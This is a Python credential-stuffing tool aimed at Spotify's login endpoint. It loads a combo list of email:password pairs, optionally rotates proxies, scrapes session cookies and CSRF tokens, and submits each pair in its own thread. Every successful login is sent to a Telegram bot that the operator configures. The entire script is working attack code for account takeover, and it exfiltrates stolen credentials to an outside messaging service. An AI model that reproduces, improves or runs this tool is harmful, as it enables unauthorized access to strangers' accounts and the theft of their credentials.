import requests
import json
import os
import time
import threading
import re
ok = 0
bd = 0
G2 = '\x1b[38;5;196m' 
G27 = '\x1b[38;5;121m' 
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
m1='\x1b[38;5;196m'
a36 = '\x1b[38;5;228m'
G20 = '\x1b[1;92m\x1b[38;5;212m'
G16 = '\x1b[1;92m\x1b[38;5;208m'
a6 = '\x1b[38;5;5m'
prox2 = False
Gkill = []
def Gprox(prox3):
    global Gkill
    with open(prox3, 'r') as file:
        Gkill = file.read().splitlines()
def prox4():
    return {'http': f'http://{Gkill[ok % len(Gkill)]}', 'https': f'http://{Gkill[ok % len(Gkill)]}'} if prox2 else None
def msg(email, pas):
    global ok, bd, cp
    os.system('clear')
    print(f'{B}ـ'*40)
    print(f'''{G}[√] Hit : {B}{ok}
{m1}[-] Bad : {a6}{bd}''')
    print(f'{B}ـ'*40)
    print(f'{S}[+] {B}{email} {S}| {B}{pas}')
    print(f'{B}ـ'*40)
    print(f'{G2}Golden {G20}- {G27}@rrrrrF')
    print(f'{B}ـ'*40)
def Check(email, pas):
    global ok, bd
    Gx1 = ""
    Gx2 = ""
    Gx3 = ""
    Gx4 = ""
    Gx5 = ""
    Gxx = "https://accounts.spotify.com/en/login"
    Gx5 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
        }
    Dx1 = requests.get(Gxx, headers=Gx5)
    Gx1 = re.search(r'__Host-device_id=(.*?);', Dx1.headers['Set-Cookie']).group(1)
    Gx2 = re.search(r'sp_sso_csrf_token=(.*?);', Dx1.headers['Set-Cookie']).group(1)
    Gx3 = re.search(r'__Host-sp_csrf_sid=(.*?);', Dx1.headers['Set-Cookie']).group(1)
    Gx4 = re.search(r'__Secure-TPASESSION=(.*?);', Dx1.headers['Set-Cookie']).group(1)
    Gx5 = re.search(r'"flowCtx":"(.*?)"', Dx1.text).group(1)
    Dx2 = "https://accounts.spotify.com/login/password"
    Dx3 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"__Host-device_id={Gx1}; __Secure-TPASESSION={Gx4}; sp_sso_csrf_token={Gx2}; sp_tr=false; __Host-sp_csrf_sid={Gx3}; remember={email}",
        "Origin": "https://accounts.spotify.com",
        "Referer": "https://accounts.spotify.com/en/login",
        "X-CSRF-Token": Gx2
    }
    Dx4 = {
        "username": email,
        "password": pas,
        "remember": "false",
        "continue": "https://accounts-gue1.spotify.com/floss/complete/05-243deba9-011d-4ae3-a9e2-d26187993d5e;2;044e1130-1091-4b3c-814a-a8cdaa190005?state=3-AQAl2UNaXwof8y_Nd7nnm81IwmyL4cUlRAa3N2ttiIva-Vd7uduZS0rMUOsHgJ1I94XtDwB7QBb2eKzETGoCIwo27npbKCh5KBAiq24weYkbVNMUSbb3oAM_X0zllL4LQyJgyIKaOLj3KXM6gr4egAsvHbnUPjc&flow_ctx=f80afa00-f44-4765-za435-7569aec3yui7845:1707078938",
        "listenerAppExperiment": "true",
        "flowCtx": Gx5
    }
    Dx2 = requests.post(Dx2, headers=Dx3, data=Dx4)
    if '"result":"ok"' in Dx2.text:
        ok += 1
        msg(email, pas)
        HitG = (f'—————————————————————\n'
                f'- Email - {email}\n'
                f'- Password - {pas}\n'
                f'—————————————————————\n')
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&parse_mode=MarkdownV2&disable_web_page_preview=true&text={HitG}")
    else:
        bd += 1
        msg(email, pas)
os.system('clear')
print('Hi pro .')
print(f'{E}ـ'*40)
ID = input(f'🔰{G27} - Enter Your ID = > ')
print(f'{E}ـ'*40)
token = input(f'🔰{G16} - Enter Your Token = > ')
print(f'{E}ـ'*40)
path = input(f'{G20}🗂 - Combo List : {G}')
print(f'{E}ـ'*40)
prox1 = input(f'{G20}🗂 - تريد استخدام بروكسيات ؟ (y/n) : {G}')
if prox1.lower() == 'y':
    prox2 = True
    prox3 = input(f'{G20}🗂 - Proxies List : {G}')
    Gprox(prox3)
print(f'{E}ـ'*40)
threads = []
for whis in open(path, 'r').read().splitlines():
    acc = str(whis)
    acc = acc.split('\n')[0]
    email = acc.split(':')[0]
    pas = acc.split(':')[1]
    thread = threading.Thread(target=Check, args=(email, pas))
    threads.append(thread)
    thread.start()
    time.sleep(4)
for thread in threads:
    thread.join()
